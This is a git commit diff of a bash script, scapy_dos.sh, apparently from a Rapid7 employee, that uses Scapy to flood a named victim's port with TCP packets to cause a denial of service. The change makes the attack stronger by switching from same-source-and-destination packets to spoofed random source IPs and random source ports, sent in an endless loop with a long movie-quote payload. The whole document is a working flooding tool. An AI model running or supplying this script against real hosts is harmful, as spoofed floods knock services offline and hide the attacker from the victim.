1e071f909e93fe1d23fdb221262b4bfb1a15c49b
abindner-r7 <andrew_bindner@rapid7.com>
2017-08-17 09:25:16 -0700

    Update scapy_dos.sh

--- scapy_dos.sh
+++ scapy_dos.sh
@@ -1,7 +1,7 @@
 #! /bin/bash
 #Creator: Andrew 'Schlpr0k' Bindner
 #Company: Rapid7
-#Version: 0.1
+#Version: 0.1.1
 #Date: 17-Aug-17
 #Description: Send a large amount of traffic to a specific victim on a particular targeted port to hopefully cause a DoS. 
 
@@ -11,10 +11,9 @@ if [ -z $1 ] || [ -z $2 ] || [ -z $3 ]; then
   exit
 fi
 
-payload=$(echo \"---Rapid7--- If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. --Rapid7--\")
-
+payload=$(echo \"If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you're looking for ransom, I can tell you I don't have money but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that --Rapid7--\")
 
 victim=$(echo \"$1\")
 scapy << EOF
-send(IP(src=$victim,dst=$victim)/TCP(sport=$2,dport=$2)/$payload,count=$3,loop=1)
+send(IP(src=RandIP(),dst=$victim)/TCP(sport=RandNum(1024,65535),dport=$2)/$payload,count=$3,loop=1)
 EOF
